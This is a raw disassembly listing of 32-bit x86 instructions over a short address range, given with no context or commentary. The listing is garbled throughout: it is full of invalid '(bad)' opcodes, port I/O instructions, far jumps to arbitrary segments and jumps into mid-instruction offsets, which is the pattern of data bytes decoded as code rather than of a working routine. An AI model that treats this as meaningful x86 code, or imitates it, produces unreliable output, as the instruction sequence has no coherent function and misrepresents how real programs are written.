  41c974:	fdivp  st(0),st
  41c976:	inc    edi
  41c977:	inc    bl
  41c979:	and    BYTE PTR [eax+esi*2+0x2],bh
  41c97d:	ins    BYTE PTR es:[edi],dx
  41c97e:	add    DWORD PTR [ebx+ecx*8+0x0],edi
  41c982:	push   0x63581df1
  41c987:	inc    edi
  41c988:	not    edx
  41c98a:	aam    0x17
  41c98c:	pop    ebx
  41c98d:	js     0x41c9ca
  41c98f:	inc    ebx
  41c990:	push   0x97349646
  41c995:	xor    al,0x85
  41c997:	jmp    0x30fc:0x24352666
  41c99e:	xor    DWORD PTR [esi],eax
  41c9a0:	and    dl,dh
  41c9a2:	adc    eax,0xe70661cb
  41c9a7:	or     bl,BYTE PTR [esi-0x3]
  41c9aa:	xlat   BYTE PTR ss:[ebx]
  41c9ac:	(bad)  
  41c9ad:	aaa    
  41c9ae:	shl    al,cl
  41c9b0:	inc    edx
  41c9b1:	dec    dl
  41c9b3:	int3   
  41c9b4:	sub    edx,DWORD PTR [esp+edx*8+0x51c045dc]
  41c9bb:	leave  
  41c9bc:	cwde   
  41c9bd:	push   cs
  41c9be:	call   0x1a8a7994
  41c9c3:	mov    WORD PTR [ebx+0x24],cs
  41c9c6:	or     BYTE PTR [eax+0x67],cl
  41c9c9:	imul   ebp,edx,0xffffff8f
  41c9cc:	jno    0x41c98d
  41c9ce:	pop    ds
  41c9cf:	xchg   edi,eax
  41c9d0:	mov    dl,0x43
  41c9d2:	pop    eax
  41c9d3:	pop    ecx
  41c9d4:	dec    edx
  41c9d5:	outs   dx,BYTE PTR ds:[esi]
  41c9d6:	xor    cl,BYTE PTR [edi]
  41c9d8:	frstor cs:[eax-0x3ae37dff]
  41c9df:	and    DWORD PTR [edx+0x63],esp
  41c9e2:	imul   esi,ebp,0xffffff98
  41c9e5:	mov    cl,0x1e
  41c9e7:	pushf  
  41c9e8:	fmul   QWORD PTR [ecx+0x3a81e4e7]
  41c9ee:	adc    eax,0xb2777da8
  41c9f3:	cmp    eax,0x2d54a852
  41c9f8:	sahf   
  41c9f9:	adc    ch,BYTE PTR [ecx-0x5f]
  41c9fc:	fbld   TBYTE PTR [edi+ecx*1]
  41c9ff:	fidiv  DWORD PTR [edi+0x4b]
  41ca02:	xchg   esi,edx
  41ca04:	loop   0x41ca18
  41ca06:	push   ebx
  41ca07:	cld    
  41ca08:	pop    ebp
  41ca09:	push   esp
  41ca0a:	lock (bad) 
  41ca0c:	das    
  41ca0d:	into   
  41ca0e:	ret    0xe6f
  41ca11:	pop    edx
  41ca12:	sbb    BYTE PTR [ecx+0x13],bl
  41ca15:	fbld   TBYTE PTR [edi+0x532bb5ea]
  41ca1b:	test   eax,0xe2c2e872
  41ca20:	call   0x8642f251
  41ca25:	(bad)  
  41ca26:	gs or  al,0xb9
  41ca29:	mov    ch,0x4e
  41ca2b:	loop   0x41ca3e
  41ca2d:	mov    dh,0xfe
  41ca2f:	retf   0xc372
  41ca32:	shr    BYTE PTR [esi],1
  41ca34:	push   ebx
  41ca35:	lods   eax,DWORD PTR ds:[esi]
  41ca36:	and    ch,BYTE PTR [esp+eax*4]
  41ca39:	jge    0x5d453da2
  41ca3f:	mov    DWORD PTR [esi-0x69],esi
  41ca42:	sub    bh,BYTE PTR [edx+eax*2]
  41ca45:	or     DWORD PTR [esi],eax
  41ca47:	outs   dx,BYTE PTR ds:[esi]
  41ca48:	test   DWORD PTR [esi-0x3ff6ad9c],esp
  41ca4e:	add    eax,0xaadc354c
  41ca53:	inc    edx
  41ca54:	shr    BYTE PTR [esi+0x24],0x18
  41ca58:	fbld   TBYTE PTR [esi-0x1839b052]
  41ca5e:	pushf  
  41ca5f:	push   0x753fe980
  41ca64:	xor    BYTE PTR ds:0xf31737b3,dl
  41ca6a:	js     0x41ca62
  41ca6c:	in     eax,dx
  41ca6d:	pushf  
  41ca6e:	rcr    dl,0x3d
  41ca71:	push   eax
  41ca72:	pop    esp
  41ca73:	sbb    ah,BYTE PTR [edx+0x2db3a2b]
  41ca79:	push   0x38
  41ca7b:	xchg   DWORD PTR [eax],ebp
  41ca7d:	outs   dx,DWORD PTR ds:[esi]
  41ca7e:	popf   
  41ca7f:	(bad)  
  41ca81:	and    edi,DWORD PTR [edx-0x3d]
  41ca84:	xor    esi,ebx
  41ca86:	in     al,0xd4
  41ca88:	pop    edi
  41ca89:	shl    DWORD PTR [eax+edx*1+0x4b],0x96
  41ca8e:	push   esp
  41ca8f:	sub    dl,BYTE PTR [eax-0x3ab1fca1]
  41ca95:	stc    
  41ca96:	mov    ss,WORD PTR [esi-0x36]
  41ca99:	cmc    
  41ca9a:	jbe    0x41ca8e
  41ca9c:	sub    ebp,DWORD PTR [edx-0x38]
  41ca9f:	pushf  
  41caa0:	mov    bh,0xf2
  41caa2:	xchg   DWORD PTR [ebx],eax
  41caa4:	push   ss
  41caa5:	fimul  WORD PTR [ebp-0x2f0e98b4]
  41caab:	adc    DWORD PTR ds:0x66e3f16b,eax
  41cab1:	cmp    BYTE PTR [edx-0x6cc0c9df],bh
  41cab7:	push   cs
  41cab8:	push   ebp
  41cab9:	cs test eax,0x6249d5a8
  41cabf:	jg     0x41ca91
  41cac1:	fadd   st(1),st
  41cac3:	adc    dl,BYTE PTR [ecx+0x3614fa45]
  41cac9:	push   ecx
  41caca:	lock lahf 
  41cacc:	jg     0x41ca84
  41cace:	mov    eax,0x970d9e6e
  41cad3:	adc    eax,0x3189c744
  41cad8:	sti    
  41cad9:	jge    0x41cabc
  41cadb:	xchg   esp,eax
  41cadc:	dec    ebx
  41cadd:	push   ss
  41cade:	adc    eax,0x64a58ffe
  41cae3:	sub    eax,0xb03fe6b6
  41cae8:	jp     0x41cb5c
  41caea:	(bad)  
  41caeb:	push   eax
  41caec:	in     al,dx
  41caed:	ins    DWORD PTR es:[edi],dx
  41caee:	jmp    0x41cacc
  41caf0:	dec    edi
  41caf1:	inc    edx
  41caf2:	ja     0x41cb09
  41caf4:	mov    eax,ds:0x14d47e60
  41caf9:	(bad)  
  41cafa:	xor    ecx,DWORD PTR [edi+0x501b82b9]
  41cb00:	xchg   ebx,eax
  41cb01:	repnz ins DWORD PTR es:[edi],dx
  41cb03:	adc    eax,0x1d36964b
  41cb08:	inc    edx
  41cb09:	or     al,0xaa
  41cb0b:	and    BYTE PTR [ebx-0x4ea34c89],cl
  41cb11:	mov    bh,0xdc
  41cb13:	je     0x41caf1
  41cb15:	inc    ecx
  41cb16:	shl    DWORD PTR [ebx+0x5fa83e27],0x87
  41cb1d:	dec    ecx
  41cb1e:	adc    DWORD PTR [esi+0x1c],eax
  41cb21:	loop   0x41cab1
  41cb23:	mov    edi,0xae00ad23
  41cb28:	jecxz  0x41cab2
  41cb2a:	jne    0x41cb99
  41cb2c:	dec    ebx
  41cb2d:	cmp    dh,al
  41cb2f:	mov    dl,0x9e
  41cb31:	push   esi
  41cb32:	xor    eax,0x87688762
  41cb37:	jne    0x41cb9a
  41cb39:	retf   
  41cb3a:	push   edx
  41cb3b:	xchg   edi,eax
  41cb3c:	sub    eax,0xc88cf1f0
  41cb41:	(bad)  
  41cb43:	fnstsw WORD PTR [eax+0x33]
  41cb46:	lock add DWORD PTR ds:0xf213c7ee,esp
  41cb4d:	repnz mov bl,dl
  41cb50:	push   es
  41cb51:	scas   eax,DWORD PTR es:[edi]
  41cb52:	jg     0x41cb86
  41cb54:	mov    ecx,0x9f973788
  41cb59:	inc    edx
  41cb5a:	mov    es,WORD PTR [esi+edi*2+0x4d]
  41cb5e:	imul   BYTE PTR [ecx]
  41cb60:	arpl   WORD PTR ds:0x86beafcf,si
  41cb66:	pop    ebp
  41cb67:	xor    DWORD PTR [edx],ecx
  41cb69:	or     eax,0x975ba816
  41cb6e:	mov    ah,0x7d
  41cb70:	call   0x3471d599
  41cb75:	test   eax,0xffa13e85
  41cb7a:	out    0xfd,eax
  41cb7c:	in     eax,0xd0
  41cb7e:	retf   
  41cb7f:	and    DWORD PTR [edx+0x63],0x2574314c
  41cb86:	fwait
  41cb87:	jg     0x41cbab
  41cb89:	jp     0x41cbdf
  41cb8b:	cmp    al,0xe
  41cb8d:	sub    al,0xb7
  41cb8f:	ins    BYTE PTR es:[edi],dx
  41cb90:	fsubr  DWORD PTR [edi+0x30]
  41cb93:	push   es
  41cb94:	cwde   
  41cb95:	xor    BYTE PTR [edi+0x5b70c5fb],dh
  41cb9b:	and    ebp,ebp
  41cb9d:	xchg   ebx,eax
  41cb9e:	sub    cl,BYTE PTR [esi+0x17]
  41cba1:	or     BYTE PTR [edx+0x49],bl
  41cba4:	int    0x2e
  41cba6:	cmp    edi,0xe2d2cee0
  41cbac:	pop    esp
  41cbad:	imul   ebx,DWORD PTR [ecx+0x58],0x6c
  41cbb1:	imul   ebx,esi,0xffffffc8
  41cbb4:	inc    ah
  41cbb6:	fwait
  41cbb7:	cmc    
  41cbb8:	loopne 0x41cb72
  41cbba:	sbb    esi,DWORD PTR [esi+0x491adc1]
  41cbc0:	pushf  
  41cbc1:	push   eax
  41cbc2:	cs (bad) 
  41cbc4:	rcl    BYTE PTR [ebx-0x57],1
  41cbc7:	div    BYTE PTR [edx-0x13]
  41cbca:	je     0x41cc41
  41cbcc:	daa    
  41cbcd:	sub    dl,BYTE PTR [edx]
  41cbcf:	aad    0x2b
  41cbd1:	retf   0x1498
  41cbd4:	outs   dx,BYTE PTR ds:[esi]
  41cbd5:	xor    eax,0x4279de84
  41cbda:	outs   dx,DWORD PTR ds:[esi]
  41cbdb:	mov    ah,0x37
  41cbdd:	mov    esi,0xbe19ac83
  41cbe2:	mov    ch,0xd0
  41cbe4:	mov    al,ds:0xf13d1134
  41cbe9:	test   al,0x61
  41cbeb:	pop    ebp
  41cbec:	test   eax,0xc59d018a
  41cbf1:	cwde   
  41cbf2:	ja     0x41cbf3
  41cbf4:	clc    
  41cbf5:	xchg   esp,eax
  41cbf6:	imul   ecx,DWORD PTR [eax],0x67a80c3d
  41cbfc:	mov    dh,0x8f
  41cbfe:	sbb    BYTE PTR [eax],dh
  41cc00:	mov    ds:0x356c50f7,al
  41cc05:	bound  esi,QWORD PTR [eax-0x318f2e47]
  41cc0b:	jp     0x41cc25
  41cc0d:	loop   0x41cc3a
  41cc0f:	cs int3 
  41cc11:	pop    eax
  41cc12:	dec    ecx
  41cc13:	cs cmp cl,0x9e
  41cc17:	aad    0x11
  41cc19:	sub    al,0xb9
  41cc1b:	icebp  
  41cc1c:	mov    esi,0xbd713ea2
  41cc21:	pop    edx
  41cc22:	and    DWORD PTR [edi],edi
  41cc24:	test   al,0x7
  41cc26:	retf   
  41cc27:	mov    cl,0x66
  41cc29:	xchg   ecx,eax
  41cc2a:	jg     0x41cc04
  41cc2c:	and    eax,0xd8beb7f5
  41cc31:	aas    
  41cc32:	push   ss
  41cc33:	push   ebx
  41cc34:	aad    0xa4
  41cc36:	add    BYTE PTR [ecx-0x6ab6f161],cl
  41cc3c:	dec    edi
  41cc3d:	outs   dx,BYTE PTR ds:[esi]
  41cc3e:	dec    ebp
  41cc3f:	(bad)  
  41cc40:	jne    0x41cc77
  41cc42:	xchg   ecx,eax
  41cc43:	cmp    BYTE PTR cs:[di],al
  41cc47:	clc    
  41cc48:	fisubr WORD PTR [edx]
  41cc4a:	cwde   
  41cc4b:	fs jmp 0x41cc48
  41cc4e:	jmp    0x41cc68
  41cc50:	fadd   DWORD PTR [esi-0x32]
  41cc53:	add    BYTE PTR [edx],dl
  41cc55:	push   eax
  41cc56:	inc    eax
  41cc57:	mov    fs,ecx
  41cc59:	jae    0x41cc99
  41cc5b:	push   es
  41cc5c:	or     DWORD PTR [edi+ebp*2-0x52d49917],esp
  41cc63:	jge    0x41cc63
  41cc65:	js     0x41ccdd
  41cc67:	sub    al,0x18
  41cc69:	xchg   edi,eax
  41cc6a:	popf   
  41cc6b:	and    DWORD PTR [edi+ebx*2+0x7067c913],esp
  41cc72:	hlt    
  41cc73:	pop    esi
  41cc74:	in     eax,0xa5
  41cc76:	cdq    
  41cc77:	pop    ds
  41cc78:	arpl   sp,sp
  41cc7a:	or     al,0x9b
  41cc7c:	stc    
  41cc7d:	addr16 add al,0x9e
  41cc80:	pop    esp
  41cc81:	and    DWORD PTR [esi],0x4c
  41cc84:	out    0x19,al
  41cc86:	dec    eax
  41cc87:	mov    ss,esi
  41cc89:	fisttp QWORD PTR [eax+ecx*2]
  41cc8c:	sti    
  41cc8d:	in     eax,dx
  41cc8e:	jmp    0xfd24:0x58be2137
  41cc95:	mov    ecx,DWORD PTR [edx-0x7afb32dc]
  41cc9b:	cmp    eax,0xa12855c0
  41cca0:	test   esp,edi
  41cca2:	jne    0x41cd1e
  41cca4:	aas    
  41cca5:	stc    
  41cca6:	cwde   
  41cca7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cca8:	cli    
  41cca9:	ds push edi
  41ccab:	xchg   edi,eax
  41ccac:	xchg   edx,eax
  41ccad:	mov    bl,0x50
  41ccaf:	push   ds
  41ccb0:	push   ebp
  41ccb1:	push   ds
  41ccb2:	ds ds add ecx,edx
  41ccb6:	out    0xf8,eax
  41ccb8:	push   edi
  41ccb9:	push   ss
  41ccba:	pop    edx
  41ccbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ccbc:	int3   
  41ccbd:	leave  
  41ccbe:	es icebp 
  41ccc0:	lahf   
  41ccc1:	int    0x15
  41ccc3:	(bad)  
  41ccc5:	rcl    BYTE PTR [ebx+0x70],1
  41ccc8:	inc    esi
  41ccc9:	lds    ebx,FWORD PTR ds:0x64273648
  41cccf:	je     0x41cd1b
  41ccd1:	or     dl,BYTE PTR [ebp-0x34]
  41ccd4:	or     DWORD PTR [ecx+0x5e],edx
  41ccd7:	adc    ch,dl
  41ccd9:	add    eax,0xc29ceb4c
  41ccde:	fstp   DWORD PTR [esi+ebx*2-0x33]
  41cce2:	sahf   
  41cce3:	inc    ecx
  41cce4:	int    0x22
  41cce6:	retf   
  41cce7:	cmp    dl,al
  41cce9:	into   
  41ccea:	sub    dl,0x81
  41cced:	std    
  41ccee:	scas   al,BYTE PTR es:[edi]
  41ccef:	fst    DWORD PTR [ebx]
  41ccf1:	scas   eax,DWORD PTR es:[edi]
  41ccf2:	xchg   di,ax
  41ccf4:	bound  eax,QWORD PTR [edx+0x68fbe69]
  41ccfa:	mov    eax,ds:0x4544864
  41ccff:	xlat   BYTE PTR ds:[ebx]
  41cd00:	cli    
  41cd01:	rol    BYTE PTR [edx],0xa
  41cd04:	pushw  ss
  41cd06:	mov    al,0xa5
  41cd08:	retf   
  41cd09:	stc    
  41cd0a:	sub    DWORD PTR [ebx],ebx
  41cd0c:	push   eax
  41cd0d:	mov    fs,WORD PTR [ebx-0x7]
  41cd10:	pop    ss
  41cd11:	push   esi
  41cd12:	xchg   ebp,eax
  41cd13:	scas   eax,DWORD PTR es:[edi]
  41cd14:	add    edi,DWORD PTR [eax+0x41]
  41cd17:	sbb    DWORD PTR [edi],0x7c
  41cd1a:	out    0xda,eax
  41cd1c:	pop    es
  41cd1d:	push   ebp
  41cd1e:	test   BYTE PTR [edx-0x35],bh
  41cd21:	fnstcw WORD PTR [eax+0x779defa7]
  41cd27:	or     al,bh
  41cd29:	add    dh,BYTE PTR [edx-0x33]
  41cd2c:	push   ds
  41cd2d:	jne    0x41ccff
  41cd2f:	inc    ecx
  41cd30:	lods   eax,DWORD PTR ds:[esi]
  41cd31:	push   ss
  41cd32:	jo     0x41ccd1
  41cd34:	and    dl,bh
  41cd36:	mov    esi,0x649ad6fc
  41cd3b:	shr    BYTE PTR [eax+0xd],1
  41cd3e:	dec    ebx
  41cd3f:	sbb    DWORD PTR [eax-0x31],0x13f08d8e
  41cd46:	push   edx
  41cd47:	dec    edi
  41cd48:	rol    BYTE PTR ds:0x1bdcbd28,0x4e
  41cd4f:	sti    
  41cd50:	jne    0x41ccdd
  41cd52:	out    dx,al
  41cd53:	xchg   ebp,eax
  41cd54:	or     eax,0xfba4818
  41cd59:	das    
  41cd5a:	jp     0x41cd8e
  41cd5c:	sti    
  41cd5d:	stos   BYTE PTR es:[edi],al
  41cd5e:	stos   DWORD PTR es:[edi],eax
  41cd5f:	sub    eax,0x88af6d11
  41cd64:	retf   
  41cd65:	push   0x46
  41cd67:	pushf  
  41cd68:	std    
  41cd69:	pusha  
  41cd6a:	cmp    bh,BYTE PTR [esi+ecx*4-0x6b]
  41cd6e:	icebp  
  41cd6f:	arpl   WORD PTR [ebp-0x56],bx
  41cd72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd73:	mov    DWORD PTR [ecx],edi
  41cd75:	lahf   
  41cd76:	add    WORD PTR [eax+ebx*4],ax
  41cd7a:	je     0x41cddf
  41cd7c:	pushf  
  41cd7d:	mov    edi,0xcaa7bb1d
  41cd82:	inc    esp
  41cd83:	xchg   BYTE PTR [eax+0xf3718ab],ch
  41cd89:	mov    DWORD PTR [edi],eax
  41cd8b:	add    DWORD PTR [edi-0x28342c1a],ebx
  41cd91:	pop    esp
  41cd92:	(bad)  
  41cd93:	mov    bl,0xb5
  41cd95:	fsubr  DWORD PTR [ebp-0x76778136]
  41cd9b:	cwde   
  41cd9c:	jae    0x41cdfc
  41cd9e:	mov    dh,BYTE PTR [ecx+ebp*4]
  41cda1:	cmp    dl,BYTE PTR [ecx]
  41cda3:	sub    BYTE PTR [edx+0x68],dh
  41cda6:	ins    BYTE PTR es:[edi],dx
  41cda7:	jbe    0x41cd90
  41cda9:	xchg   esi,eax
  41cdaa:	stc    
  41cdab:	mov    ebx,gs
  41cdad:	ret    0x16df
  41cdb0:	dec    esi
  41cdb1:	push   edx
  41cdb2:	mov    ah,BYTE PTR [edi+0x78]
  41cdb5:	adc    esi,DWORD PTR [edi]
  41cdb7:	std    
  41cdb8:	cs stos DWORD PTR es:[edi],eax
  41cdba:	dec    edi
  41cdbb:	xchg   ecx,eax
  41cdbc:	out    0x4c,eax
  41cdbe:	mov    ebx,0x5f2db62c
  41cdc3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cdc4:	dec    edx
  41cdc5:	aad    0xf1
  41cdc7:	sahf   
  41cdc8:	loop   0x41cda4
  41cdca:	pop    ds
  41cdcb:	push   ss
  41cdcc:	or     eax,0x6a4e4705
  41cdd1:	retf   
  41cdd2:	inc    BYTE PTR [edi-0x7cf7c560]
  41cdd8:	arpl   WORD PTR [ebp+0xa],bp
  41cddb:	out    0x59,al
  41cddd:	mul    BYTE PTR [edx]
  41cddf:	retf   0x3aa
  41cde2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cde3:	call   0xf64069b6
  41cde8:	dec    eax
  41cde9:	or     al,0x60
  41cdeb:	adc    ebx,DWORD PTR [ebx]
  41cded:	scas   al,BYTE PTR es:[edi]
  41cdee:	push   edx
  41cdef:	lds    esi,FWORD PTR [ebx-0x6a535454]
  41cdf5:	inc    eax
  41cdf6:	dec    eax
  41cdf7:	ins    DWORD PTR es:[edi],dx
  41cdf8:	or     ecx,DWORD PTR [eax-0x11]
  41cdfb:	push   ecx
  41cdfc:	popf   
  41cdfd:	mov    al,ds:0xf5ca03d4
  41ce02:	add    esi,DWORD PTR [ebx]
  41ce04:	or     eax,0x7d66c36b
  41ce09:	test   ah,bl
  41ce0b:	sub    esi,DWORD PTR [ebx]
  41ce0d:	mov    ds:0x97a65fd8,eax
  41ce12:	xchg   ebp,eax
  41ce13:	inc    edi
  41ce14:	cmp    DWORD PTR [ecx],ecx
  41ce16:	sub    ebp,ebx
  41ce18:	idiv   DWORD PTR [edx+0x4c6dd108]
  41ce1e:	push   ss
  41ce1f:	inc    ebx
  41ce20:	xchg   esi,eax
  41ce21:	jns    0x41ce43
  41ce23:	sub    al,0x72
  41ce25:	push   ecx
  41ce26:	pusha  
  41ce27:	outs   dx,DWORD PTR ds:[esi]
  41ce28:	push   esp
  41ce29:	cld    
  41ce2a:	pop    ds
  41ce2b:	out    dx,al
  41ce2c:	mov    ecx,0x747f8422
  41ce31:	aas    
  41ce32:	or     ch,BYTE PTR [edx-0x5fc1ddb8]
  41ce38:	pop    ss
  41ce39:	mov    edx,0x68692a4d
  41ce3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce3f:	sahf   
  41ce40:	jmp    0x41cdf6
  41ce42:	frstor [eax-0x6485fb43]
  41ce48:	fnstcw WORD PTR ds:0x18111c51
  41ce4e:	fidivr WORD PTR [eax]
  41ce50:	jne    0x41ce4c
  41ce52:	ret    
  41ce53:	retf   0x8703
  41ce56:	pop    edi
  41ce57:	in     eax,dx
  41ce58:	add    al,0xa0
  41ce5a:	scas   eax,DWORD PTR es:[edi]
  41ce5b:	popf   
  41ce5c:	mov    ebx,0xb5a510fc
  41ce61:	inc    ebx
  41ce62:	or     BYTE PTR [eax+0x1fd8dce1],al
  41ce68:	cld    
  41ce69:	arpl   WORD PTR ds:0xebbb2c31,cx
  41ce6f:	pop    ecx
  41ce70:	cdq    
  41ce71:	push   ds
  41ce72:	xchg   edi,eax
  41ce73:	sbb    dh,BYTE PTR [ecx+0x5a7e149e]
  41ce79:	adc    dh,BYTE PTR [esi-0x3993e2c]
  41ce7f:	add    BYTE PTR [ebx-0x3b],0x59
  41ce83:	pop    ebx
  41ce84:	mov    ecx,0x1406a2f2
  41ce89:	xor    DWORD PTR [ecx+0x1395ff7d],edi
  41ce8f:	ja     0x41ce91
  41ce91:	dec    esi
  41ce92:	scas   eax,DWORD PTR es:[edi]
  41ce93:	add    ebx,DWORD PTR [ecx]
  41ce95:	scas   eax,DWORD PTR es:[edi]
  41ce96:	fs inc esp
  41ce98:	mov    bl,BYTE PTR [ecx+0x206f0eed]
  41ce9e:	mov    dl,0x6a
  41cea0:	(bad)  [ebx+edx*2]
  41cea3:	jo     0x41ce5c
  41cea5:	pushf  
  41cea6:	std    
  41cea7:	call   0x9f3cb7e9
  41ceac:	inc    ecx
  41cead:	retf   
  41ceae:	lock stos BYTE PTR es:[edi],al
  41ceb0:	fidivr WORD PTR [edi-0x2]
  41ceb3:	dec    edi
  41ceb4:	mov    BYTE PTR [ebp-0x4189509a],cl
  41ceba:	pop    ds
  41cebb:	mov    WORD PTR [ebx+0x5b48f297],fs
  41cec1:	mov    al,0x87
  41cec3:	push   esp
  41cec4:	and    eax,0x33c1a345
  41cec9:	and    BYTE PTR [edi+0xadc6925],al
  41cecf:	sub    al,BYTE PTR [ecx+0x50]
  41ced2:	inc    ecx
  41ced3:	dec    ebp
  41ced4:	test   eax,0x3d4737ed
  41ced9:	pop    ss
  41ceda:	adc    eax,0xfaf95e82
  41cedf:	mov    dh,0x15
  41cee1:	fbstp  TBYTE PTR [edx]
  41cee3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cee4:	mov    eax,0xbdca1ac0
  41cee9:	mul    edi
  41ceeb:	outs   dx,DWORD PTR ds:[esi]
  41ceec:	mov    ds:0xfc8f47a7,al
  41cef1:	xchg   edi,eax
  41cef2:	mov    ah,0x50
  41cef4:	mov    ch,0x2c
  41cef6:	inc    ecx
  41cef7:	js     0x41ce7c
  41cef9:	out    dx,eax
  41cefa:	pop    eax
  41cefb:	xchg   esi,eax
  41cefc:	bound  ecx,QWORD PTR [esi+0x44]
  41ceff:	aaa    
  41cf00:	stc    
  41cf01:	sti    
  41cf02:	ja     0x41cf0f
  41cf04:	or     edx,DWORD PTR [ebp-0x5b]
  41cf07:	aam    0x44
  41cf09:	push   edx
  41cf0a:	jp     0x41ceea
  41cf0c:	lods   eax,DWORD PTR ds:[esi]
  41cf0d:	arpl   WORD PTR [edx],sp
  41cf0f:	sahf   
  41cf10:	test   bl,dh
  41cf12:	cmp    BYTE PTR [ebx],cl
  41cf14:	addr16 xchg edi,eax
  41cf16:	sar    BYTE PTR [esi+0x4354d55e],1
  41cf1c:	adc    al,0xc3
  41cf1e:	test   al,0x4f
  41cf20:	mov    al,0x64
  41cf22:	sahf   
  41cf23:	mov    esi,0x25c2621a
  41cf28:	into   
  41cf29:	adc    al,0x81
  41cf2b:	into   
  41cf2c:	adc    ecx,DWORD PTR [esi]
  41cf2e:	shl    BYTE PTR [ecx+0x1ec4b5fb],1
  41cf34:	adc    dh,BYTE PTR [eax+0x42]
  41cf37:	mov    ?,WORD PTR [edi+eax*4]
  41cf3a:	sqrtps xmm3,XMMWORD PTR [ebx+ebx*2-0xf7a86b8]
  41cf42:	cwde   
  41cf43:	ja     0x41cfa1
  41cf45:	sbb    BYTE PTR [ebx],ah
  41cf47:	mov    al,0xbc
  41cf49:	aas    
  41cf4a:	inc    edi
  41cf4b:	jl     0x41cfb5
  41cf4d:	test   DWORD PTR [ebx-0x7003dc8],edi
  41cf53:	retf   
  41cf54:	push   ecx
  41cf55:	rcl    DWORD PTR [edi-0x1793788f],0x6e
  41cf5c:	outs   dx,DWORD PTR ds:[esi]
  41cf5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf5e:	and    al,0xff
  41cf60:	fs jmp 0x41cf4d
  41cf63:	sti    
  41cf64:	add    BYTE PTR ds:0xb7d54430,al
  41cf6a:	lock sub al,0x68
  41cf6d:	aad    0x74
  41cf6f:	xchg   edi,eax
  41cf70:	in     eax,0x1
  41cf72:	aad    0xf4
  41cf74:	mov    ds:0xc48f2b02,al
  41cf79:	je     0x41cff7
  41cf7b:	leave  
  41cf7c:	mov    al,ds:0x5d9e09be
  41cf81:	push   cs
  41cf82:	cs (bad) 
  41cf84:	aam    0x13
  41cf86:	ss mov ecx,0x74537568
  41cf8c:	mov    dl,0xd2
  41cf8e:	jp     0x41cf52
  41cf90:	mov    bh,0x13
  41cf92:	pop    ecx
  41cf93:	xor    ch,BYTE PTR [ecx]
  41cf95:	icebp  
  41cf96:	cld    
  41cf97:	xchg   ecx,eax
  41cf98:	and    dl,BYTE PTR [esi+eiz*8+0x57]
  41cf9c:	cmp    esi,edx
  41cf9e:	popf   
  41cf9f:	mov    edi,0xd9e9ebf8
  41cfa4:	aas    
  41cfa5:	sbb    DWORD PTR [esi-0x80],esp
  41cfa8:	call   0xd1ff:0xa777ea8a
  41cfaf:	jmp    0xd9a8:0x571e6344
  41cfb6:	fidiv  WORD PTR [ebp+0x18]
  41cfb9:	(bad)  
  41cfba:	sti    
  41cfbb:	pop    esi
  41cfbc:	dec    esi
  41cfbd:	cmp    al,BYTE PTR ds:0xce7c97d2
  41cfc3:	mov    bl,0x4e
  41cfc5:	jl     0x41cfbe
  41cfc7:	xor    edi,DWORD PTR [ebx]
  41cfc9:	lea    edi,[ebx-0x23]
  41cfcc:	aas    
  41cfcd:	aad    0x1a
  41cfcf:	and    ecx,DWORD PTR [edi+0x645fdbb]
  41cfd5:	leave  
  41cfd6:	jno    0x41cf65
  41cfd8:	test   edi,0x2af7d0d7
  41cfde:	es jle 0x41d04b
  41cfe1:	out    dx,al
  41cfe2:	dec    edx
  41cfe3:	jl     0x41cff6
  41cfe5:	call   edx
  41cfe7:	push   es
  41cfe8:	or     al,0x40
  41cfea:	call   0x456cbbc2
  41cfef:	jbe    0x41cfb1
  41cff1:	xchg   edx,eax
  41cff2:	push   esi
  41cff3:	loopne 0x41cfec
  41cff5:	push   ss
  41cff6:	fldcw  WORD PTR [ebx-0x6b]
  41cff9:	mov    dl,0x46
  41cffb:	cs add ebx,esi
  41cffe:	inc    edi
  41cfff:	ins    BYTE PTR es:[edi],dx
  41d000:	cld    
  41d001:	cmp    eax,0xb0ed6f61
  41d006:	push   ss
  41d007:	mov    esi,0x44fbd7d5
  41d00c:	ins    DWORD PTR es:[edi],dx
  41d00d:	pop    ds
  41d00e:	lahf   
  41d00f:	fs push eax
  41d011:	dec    ecx
  41d012:	push   ebp
  41d013:	out    dx,eax
  41d014:	lods   eax,DWORD PTR ds:[esi]
  41d015:	sub    eax,0x5e1c4ec5
  41d01a:	ror    DWORD PTR [edi+ebp*2+0x41],0x34
  41d01f:	jo     0x41d011
  41d021:	fld    TBYTE PTR [esi+0x56bcdec9]
  41d027:	sub    dh,cl
  41d029:	pusha  
  41d02a:	fisttp QWORD PTR [esi+0x63]
  41d02d:	bound  eax,QWORD PTR [ecx-0x66]
  41d030:	dec    esp
  41d031:	pop    edi
  41d032:	imul   esi,ebp,0x8fe34a53
  41d038:	adc    al,0x8f
  41d03a:	int    0x47
  41d03c:	repnz sbb ebp,DWORD PTR [ecx-0x1886ad6b]
  41d043:	div    edi
  41d045:	mov    edi,0xe93ce002
  41d04a:	adc    BYTE PTR [ebp+0x1ca64d26],ah
  41d050:	xchg   BYTE PTR [esi-0x10cb99f9],bl
  41d056:	loope  0x41d0a2
  41d058:	outs   dx,BYTE PTR ds:[esi]
  41d059:	sbb    BYTE PTR [esi],dl
  41d05b:	(bad)  
  41d05c:	sbb    dl,BYTE PTR [ecx-0x30]
  41d05f:	jecxz  0x41d07f
  41d061:	mov    al,ds:0x2ba08c07
  41d066:	sub    esp,DWORD PTR ds:0x4b3f18fe
  41d06c:	mov    bh,0xf3
  41d06e:	into   
  41d06f:	call   0xdc6c81cd
  41d074:	xor    ch,bl
  41d076:	pop    esp
  41d077:	dec    esi
  41d078:	imul   edi,edi,0x21e4a0d4
  41d07e:	jbe    0x41d0f9
  41d080:	jmp    0x7736:0x5b400cb5
  41d087:	xchg   edx,eax
  41d088:	add    edx,ecx
  41d08a:	imul   eax,DWORD PTR [esi+0x6450499e],0xcfc7d359
  41d094:	cmp    ebp,DWORD PTR [ebp-0x7e4fc90b]
  41d09a:	loopne 0x41d0fd
  41d09c:	test   bh,0x3a
  41d09f:	ja     0x41d0d2
  41d0a1:	fiadd  DWORD PTR [ebx]
  41d0a3:	hlt    
  41d0a4:	jmp    0x41d0a8
  41d0a6:	jns    0x41d048
